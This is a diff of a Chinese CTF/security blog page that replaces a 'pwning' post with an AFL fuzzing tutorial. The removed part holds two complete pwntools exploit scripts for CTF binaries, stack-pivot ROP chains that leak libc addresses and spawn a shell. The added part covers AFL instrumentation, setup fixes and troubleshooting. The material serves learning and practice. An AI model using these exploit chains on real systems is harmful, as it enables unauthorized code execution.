@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>pwning | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="pwning | 风云阁">
+  <title>AFL基础 | 风云阁</title>
+  <meta name="keywords" content=" fuzz , afl ">
+  <meta name="description" content="AFL基础 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[toc] Defcon Qual 2019Defcon CTF 2020 5月就开赛了，复盘了一些去年的题目。  speedrun-009 保护全开   格式化字符串漏洞、栈溢出 攻击思路   fmt 泄露栈上内容，得到libc一些符号地址，one_gadget也就有了  fmt 泄露canary  ROP 到one_gadget  Pwned!#!&#x2F;usr&#x2F;bin&#x2F;env python #co">
 <meta property="og:type" content="article">
@@ -311,19 +311,27 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-pwning" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-AFL基础" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">pwning</h1>
+        <h1 class="article-title">AFL基础</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a class="color5">fuzz</a>
+            
+            <a class="color4">afl</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 02:06:12'>2019-05-10 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-10 12:40:24'>2020-04-10 12:35</time>
         
     </div>
     <div class="article-meta">
@@ -345,7 +353,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwning-Magic"><span class="toc-text">Pwning Magic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Migration"><span class="toc-text">Stack Migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-Training"><span class="toc-text">HITCON Training</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#西湖论剑线下赛-pwn-main"><span class="toc-text">西湖论剑线下赛 pwn main</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fuzzing-炼金路"><span class="toc-text">Fuzzing 炼金路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#开箱即用的佩剑-——-AFL"><span class="toc-text">开箱即用的佩剑 —— AFL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#初识佩剑"><span class="toc-text">初识佩剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深入探究"><span class="toc-text">深入探究</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见问题"><span class="toc-text">常见问题</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -361,89 +369,128 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Pwning-Magic"><a href="#Pwning-Magic" class="headerlink" title="Pwning Magic"></a>Pwning Magic</h1><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><blockquote>
-<p> Download link:</p>
-<p><a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
+        <p>[toc]</p>
+<h1 id="Fuzzing-炼金路"><a href="#Fuzzing-炼金路" class="headerlink" title="Fuzzing 炼金路"></a>Fuzzing 炼金路</h1><p>Lazy Pwner ☞ primelee</p>
+<blockquote>
+<p>声明：以下仅作为笔记学习，不是作者原创。</p>
 </blockquote>
-<h2 id="HITCON-Training"><a href="#HITCON-Training" class="headerlink" title="HITCON Training"></a>HITCON Training</h2><pre><code class="python">from pwn import *
-p = process(&#39;./migration&#39;)
-context.arch = &#39;i386&#39;
-elf = ELF(&#39;./migration&#39;,False)
-libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;,False)
-bss = elf.bss()
-buf = bss+0x200
-buf2 = bss+0x300
-leave_ret = 0x08048504
-pop_ebx_ret = 0x0804836d
-read_plt = elf.symbols[&#39;read&#39;]
-read_got = elf.got[&#39;read&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-puts_plt = elf.symbols[&#39;puts&#39;]
-puts_libc = libc.symbols[&#39;puts&#39;]
-sys_libc = libc.symbols[&#39;system&#39;]
+<h2 id="开箱即用的佩剑-——-AFL"><a href="#开箱即用的佩剑-——-AFL" class="headerlink" title="开箱即用的佩剑 —— AFL"></a>开箱即用的佩剑 —— AFL</h2><ol>
+<li><p><code>make .</code></p>
+</li>
+<li><p>写栈溢出源码 <code>gets(name)</code></p>
+<p><img src="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021009932.png" alt="image-20200302021009932"></p>
+</li>
+<li><p>插桩编译</p>
+<p><img src="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021513499-6493565.png" alt="image-20200302021513499"></p>
+</li>
+<li><p>创建初识语料库</p>
+<pre><code>echo &#39;Pwn me&#39; &gt;&gt; ./input/a.in</code></pre></li>
+<li><p>Go fuzzing !</p>
+<p>Oh no … </p>
+<p><img src="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302021916706.png" alt="image-20200302021916706"></p>
+<p>Fix it…</p>
+<pre><code>sudo echo core &gt;/proc/sys/kernel/core_pattern</code></pre></li>
+<li><p>Fuzz again !</p>
+<p><img src="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022711028.png" alt="image-20200302022711028"></p>
+</li>
+<li><p>Chart , love it !</p>
+<p><img src="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/image-20200302022730604.png" alt="image-20200302022730604"></p>
+</li>
+</ol>
+<h2 id="初识佩剑"><a href="#初识佩剑" class="headerlink" title="初识佩剑"></a>初识佩剑</h2><blockquote>
+<p>精华提取自 <a href="http://lcamtuf.coredump.cx/afl/README.txt" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/README.txt</a></p>
+</blockquote>
+<p>面临的问题 —— 难以覆盖全部执行路径</p>
+<p>​    <strong>Unfortunately, fuzzing is also relatively  blind, random mutations make it very unlikely to reach certain code paths</strong></p>
+<p>解决思路：</p>
+<ol>
+<li><strong>corpus distillation：The method relies on coverage signals to select a subset of interesting seeds from a massive, high-quality corpus of candidate files, and then fuzz them by traditional means.</strong></li>
+<li>more sophisticated research has focused on techniques such as program flow analysis (“concolic execution”), symbolic execution, or static analysis. </li>
+</ol>
+<p>afl-fuzz 算法摘要 ⏬</p>
+<pre><code>Simplifying a bit, the overall algorithm can be summed up as:
 
-p.recvuntil(&#39;:\n&#39;)
-pay = &#39;a&#39;*0x28+flat([buf,read_plt,leave_ret,0,buf,100])
-p.send(pay)
-sleep(0.01)
-pay = flat([buf2,puts_plt,pop_ebx_ret,puts_got,read_plt,leave_ret,0,buf2,100])
-p.send(pay)
+  1) Load user-supplied initial test cases into the queue,
 
-puts_real = u32(p.recv(4))
-print hex(puts_real)
+  2) Take next input file from the queue,
 
-libc_base = puts_real - puts_libc
-sys_real = libc_base + sys_libc
+  3) Attempt to trim the test case to the smallest size that doesn&#39;t alter
+     the measured behavior of the program,
 
-pay = flat([0,sys_real,0,buf2+4*4,&#39;/bin/sh\x00&#39;])
-p.sendline(pay)
+  4) Repeatedly mutate the file using a balanced and well-researched variety
+     of traditional fuzzing strategies,
 
-p.interactive()</code></pre>
-<h2 id="西湖论剑线下赛-pwn-main"><a href="#西湖论剑线下赛-pwn-main" class="headerlink" title="西湖论剑线下赛 pwn main"></a>西湖论剑线下赛 pwn main</h2><p>64位栈迁移</p>
-<pre><code class="python">#!/usr/bin/env python
-#coding=utf8
-from pwn import *
-p = process(&#39;./main&#39;)
-context.arch = &#39;amd64&#39;
-elf = ELF(&#39;./main&#39;,False)
-libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,False)
+  5) If any of the generated mutations resulted in a new state transition
+     recorded by the instrumentation, add mutated output as a new entry in the
+     queue.
 
-if 0:
-    context.log_level = &#39;debug&#39;
-    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-    gdb.attach(p)
+  6) Go to 2.</code></pre><p> 源码编译插桩 ( Instrumenting programs for use with AFL )</p>
+<pre><code class="shell">$ CC=/path/to/afl/afl-gcc ./configure
+$ make clean all
+#For C++ programs, you&#39;d would also want to set CXX=/path/to/afl/afl-g++.</code></pre>
+<p>源码 fuzz lib</p>
+<pre><code>When testing libraries, you need to find or write a simple program that reads
+data from stdin or from a file and passes it to the tested library. In such a
+case, it is essential to link this executable against a static version of the
+instrumented library, or to make sure that the correct .so file is loaded at
+runtime (usually by setting LD_LIBRARY_PATH). The simplest option is a static
+build, usually possible via:
 
-puts_plt = elf.symbols[&#39;puts&#39;]
-puts_got  = elf.got[&#39;puts&#39;]
-read_plt = elf.symbols[&#39;read&#39;]
-puts_libc = libc.symbols[&#39;puts&#39;]
-main_addr = 0x4006C3
-pop_rdi_ret = 0x00000000004007a3
-leave_ret = 0x0000000000400733
-pop_rbp_ret =  0x00000000004005e0
-read_leave_ret = 0x400718 #lea rax, [rbp-40h]
-one_off = 0xf1147
+$ CC=/path/to/afl/afl-gcc ./configure --disable-shared</code></pre><blockquote>
+<p>📒NOTE：</p>
+<pre><code class="markdown">Setting AFL_HARDEN=1 when calling &#39;make&#39; will cause the CC wrapper to
+automatically enable code hardening options that make it easier to detect
+simple memory bugs. Libdislocator, a helper library included with AFL (see
+libdislocator/README.dislocator) can help uncover heap corruption issues, too.</code></pre>
+</blockquote>
+<p>黑盒插桩 （on-the-fly instrumentation of black-box binaries）</p>
+<pre><code>When source code is *NOT* available, the fuzzer offers experimental support for
+fast, on-the-fly instrumentation of black-box binaries. This is accomplished
+with a version of QEMU running in the lesser-known &quot;user space emulation&quot; mode.</code></pre><p>⚠️ <strong>警告</strong></p>
+<pre><code>1 - Your CPU will run hot and will need adequate cooling. In most cases, if
+    cooling is insufficient or stops working properly, CPU speeds will be
+    automatically throttled. That said, especially when fuzzing on less
+    suitable hardware (laptops, smartphones, etc), it&#39;s not entirely impossible
+    for something to blow up.
 
-#bss = elf.bss#0x602000-0x200
-name_addr = 0x00601080
-buf = 0x0601080+0x600
-buf2 = buf+0x100
+2 - Targeted programs may end up erratically grabbing gigabytes of memory or
+    filling up disk space with junk files. AFL tries to enforce basic memory
+    limits, but can&#39;t prevent each and every possible mishap. The bottom line
+    is that you shouldn&#39;t be fuzzing on systems where the prospect of data loss
+    is not an acceptable risk.
 
-p.recvuntil(&#39;Input Your Name:\n&#39;)
-rop = &#39;\x00&#39;*0x100
-rop += flat([buf2,pop_rdi_ret,puts_got,puts_plt,read_leave_ret])
-p.send(rop)
-p.recvuntil(&#39;Input Buffer:\n&#39;)
-rop = &#39;a&#39;*0x40; rop += flat([name_addr+0x100,leave_ret])
-p.send(rop)
-puts_real = u64(p.recv(6)+&#39;\x00&#39;*2)
-one = puts_real - puts_libc + one_off
-print hex(one)
-rop = flat([one,0,0,0,0,0,0,0,buf2-0x48,leave_ret])
-p.send(rop)
+3 - Fuzzing involves billions of reads and writes to the filesystem. On modern
+    systems, this will be usually heavily cached, resulting in fairly modest
+    &quot;physical&quot; I/O - but there are many factors that may alter this equation.
+    It is your responsibility to monitor for potential trouble; with very heavy
+    I/O, the lifespan of many HDDs and SSDs may be reduced.</code></pre><p><strong>Qemu mode 安装</strong></p>
+<p>遇到的坑很多，参考这篇博文 <a href="http://www.gandalf.site/2019/01/aflafl-qemufuzz.html" target="_blank" rel="noopener">http://www.gandalf.site/2019/01/aflafl-qemufuzz.html</a></p>
+<h2 id="深入探究"><a href="#深入探究" class="headerlink" title="深入探究"></a>深入探究</h2><p>输入文件集蒸馏工具 <code>afl-cmin</code> </p>
+<p>单个文件蒸馏 <code>afl-tmin</code> </p>
+<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol>
+<li><p>第一次运行 <code>afl-fuzz</code> 失败。 ✅</p>
+<pre><code>[-] Hmm, your system is configured to send core dump notifications to an
+    external utility. This will cause issues: there will be an extended delay
+    between stumbling upon a crash and having this information relayed to the
+    fuzzer via the standard waitpid() API.
 
-p.interactive()
-</code></pre>
+    To avoid having crashes misinterpreted as timeouts, please log in as root
+    and temporarily modify /proc/sys/kernel/core_pattern, like so:
+
+    echo core &gt;/proc/sys/kernel/core_pattern
+
+[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;
+         Location : check_crash_handling(), afl-fuzz.c:7275
+
+ cat /proc/sys/kernel/core_pattern
+|/usr/share/apport/apport %p %s %c %d %P</code></pre></li>
+<li><p>文件读入按照文档要求加了符号 <code>@@</code> ，无法触发crash。✅</p>
+<pre><code>文件读入的前提是文件作为参数。
+./your_target_program file_name 
+# 运行成功 
+
+afl-fuzz -i testcases -o result ./your_target_program file_name</code></pre></li>
+</ol>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -453,12 +500,12 @@ p.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>pwning</p>
+    <p><span class="copy-title">文章标题:</span>AFL基础</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-10, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 02:06:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/05/10/pwning/" title="pwning">https://primelyw.github.io/2019/05/10/pwning/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-10, 12:35:49</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-10, 12:40:24</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/" title="AFL基础">https://primelyw.github.io/2020/04/10/AFL%E5%9F%BA%E7%A1%80/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
